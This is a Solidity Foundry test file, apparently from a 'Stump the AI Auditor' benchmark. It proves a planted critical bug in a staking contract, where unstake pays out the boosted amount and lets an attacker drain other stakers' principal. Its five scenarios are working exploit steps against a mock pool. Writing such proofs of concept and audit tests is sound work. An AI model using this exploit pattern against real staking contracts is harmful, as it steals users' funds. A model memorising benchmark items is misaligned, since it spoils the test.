// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {BaseTest} from "./helpers/BaseTest.sol";
import {MockERC20} from "src/mocks/MockERC20.sol";
import {Staking} from "src/Staking/Staking.sol";
import {IStaking} from "src/interfaces/IStaking.sol";

// ─────────────────────────────────────────────────────────────────────────────
// Stump the AI Auditor — PoC for Staking.sol
//
// Vulnerability: Unstake Transfers Boosted Amount Instead of Raw Principal
// Severity: Critical (direct theft of other stakers' funds)
// Contract: src/Staking/Staking.sol — unstake()
//
// Root cause:
//   `unstake` transfers `boostedAmount` to the withdrawing user instead of
//   `amount`. For 1x boost tiers, these are identical. For 2x/3x tiers,
//   the user receives 2x/3x their actual deposit, draining funds that
//   belong to other stakers.
//
// Impact:
//   - Direct theft: user deposits 100, waits for unlock, withdraws 200/300
//   - Other stakers' principal is drained
//   - Protocol insolvency after sufficient 2x/3x unstakes
// ─────────────────────────────────────────────────────────────────────────────

contract PlantPoC_S8 is BaseTest {
    uint256 internal constant DUST = 1_000;

    MockERC20 internal stakingToken;
    Staking internal staking;
    uint8 internal tier30; // 1x, 30d
    uint8 internal tier60; // 2x, 60d
    uint8 internal tier90; // 3x, 90d

    address internal attacker;
    address internal victim;

    function setUp() public override {
        super.setUp();
        attacker = makeAddr("attacker");
        victim = makeAddr("victim");

        stakingToken = deployMockToken("STK", 18);

        vm.startPrank(owner);
        staking = new Staking(IERC20(address(stakingToken)), address(stakingToken), 1_000);
        tier30 = staking.setLockTier(30 days, 10_000);  // 1x
        tier60 = staking.setLockTier(60 days, 20_000);  // 2x
        tier90 = staking.setLockTier(90 days, 30_000);  // 3x
        vm.stopPrank();

        mintAndApprove(stakingToken, attacker, address(staking), 100_000 ether);
        mintAndApprove(stakingToken, victim, address(staking), 100_000 ether);
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Scenario 1: 1x tier — regression check, no difference
    // ─────────────────────────────────────────────────────────────────────────

    function testPoC_S8_tier1x_correctAmount() public {
        vm.prank(attacker);
        staking.stake(100 ether, tier30);

        warp(30 days);

        uint256 balBefore = stakingToken.balanceOf(attacker);
        vm.prank(attacker);
        staking.unstake(0);

        assertEq(stakingToken.balanceOf(attacker) - balBefore, 100 ether, "1x tier returns exact principal");
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Scenario 2: 2x tier — attacker withdraws double principal
    // ─────────────────────────────────────────────────────────────────────────

    function testPoC_S8_tier2x_doublesWithdrawal() public {
        // Victim provides the liquidity pool
        vm.prank(victim);
        staking.stake(500 ether, tier30);

        // Attacker stakes 100 at 2x boost
        vm.prank(attacker);
        staking.stake(100 ether, tier60);

        warp(60 days);

        uint256 balBefore = stakingToken.balanceOf(attacker);
        vm.prank(attacker);
        staking.unstake(0);

        uint256 withdrawn = stakingToken.balanceOf(attacker) - balBefore;

        // Bug: attacker deposited 100, withdrew 200 (boostedAmount)
        assertEq(withdrawn, 200 ether, "2x tier: attacker gets 200 for 100 deposit");

        // Contract is now short 100 ether of victim's principal
        uint256 contractBal = stakingToken.balanceOf(address(staking));
        assertLt(contractBal, staking.totalRawSupply(), "contract insolvent: balance < totalRawSupply");
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Scenario 3: 3x tier — attacker withdraws triple principal
    // ─────────────────────────────────────────────────────────────────────────

    function testPoC_S8_tier3x_triplesWithdrawal() public {
        vm.prank(victim);
        staking.stake(500 ether, tier30);

        vm.prank(attacker);
        staking.stake(100 ether, tier90);

        warp(90 days);

        uint256 balBefore = stakingToken.balanceOf(attacker);
        vm.prank(attacker);
        staking.unstake(0);

        uint256 withdrawn = stakingToken.balanceOf(attacker) - balBefore;

        // Bug: 100 deposited → 300 withdrawn
        assertEq(withdrawn, 300 ether, "3x tier: attacker gets 300 for 100 deposit");

        // Contract 200 short
        uint256 contractBal = stakingToken.balanceOf(address(staking));
        uint256 deficit = staking.totalRawSupply() - contractBal;
        assertEq(deficit, 200 ether, "200 ether stolen from pool");
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Scenario 4: Repeated exploitation drains entire pool
    // ─────────────────────────────────────────────────────────────────────────

    function testPoC_S8_repeatedExploit_drainsPool() public {
        // Victim provides large liquidity
        vm.prank(victim);
        staking.stake(1000 ether, tier30);

        // Attacker stakes small amounts at 3x and drains
        uint256 totalStolen;
        for (uint256 i = 0; i < 3; i++) {
            vm.prank(attacker);
            staking.stake(100 ether, tier90);

            warp(90 days);

            uint256 balBefore = stakingToken.balanceOf(attacker);
            vm.prank(attacker);
            staking.unstake(i);

            uint256 withdrawn = stakingToken.balanceOf(attacker) - balBefore;
            totalStolen += withdrawn - 100 ether; // excess over principal
        }

        // Attacker stole 200 ether per round × 3 = 600 ether from victim's pool
        assertEq(totalStolen, 600 ether, "600 ether stolen over 3 rounds");

        // Victim's funds are gone — they can't unstake fully
        uint256 contractBal = stakingToken.balanceOf(address(staking));
        assertLt(contractBal, 1000 ether, "victim's principal partially drained");
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Scenario 5: Victim can't withdraw (insufficient balance)
    // ─────────────────────────────────────────────────────────────────────────

    function testPoC_S8_victimCannotWithdraw() public {
        vm.prank(victim);
        staking.stake(200 ether, tier30);

        vm.prank(attacker);
        staking.stake(100 ether, tier60);

        warp(60 days);

        // Attacker drains: deposits 100, withdraws 200
        vm.prank(attacker);
        staking.unstake(0);

        // Contract now has 100 ether (300 deposited - 200 withdrawn)
        // But victim's totalRawSupply claim is 200 ether
        warp(30 days); // victim's lock expires

        // Victim tries to unstake 200 — will it succeed?
        // Contract only has 100, but victim's amount is 200 (1x)
        // safeTransfer of 200 would fail if balance < 200
        uint256 contractBal = stakingToken.balanceOf(address(staking));
        assertEq(contractBal, 100 ether, "only 100 left in contract");

        vm.prank(victim);
        vm.expectRevert(); // ERC20 insufficient balance
        staking.unstake(0);
    }
}
